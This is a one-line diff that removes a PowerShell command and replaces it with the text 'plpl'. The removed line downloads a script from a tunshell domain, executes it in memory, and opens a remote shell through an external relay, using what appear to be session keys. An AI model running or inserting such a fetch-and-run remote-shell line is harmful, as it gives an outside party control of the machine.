@@ -1,1 +1,1 @@
-[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; &$([scriptblock]::Create((New-Object System.Net.WebClient).DownloadString('https://lets.tunshell.com/init.ps1'))) T K1JIYVi5x1BRcIDDuGMAJo GIivbsW5z15i2ZCPYhZLl9 au.relay.tunshell.com
+plpl
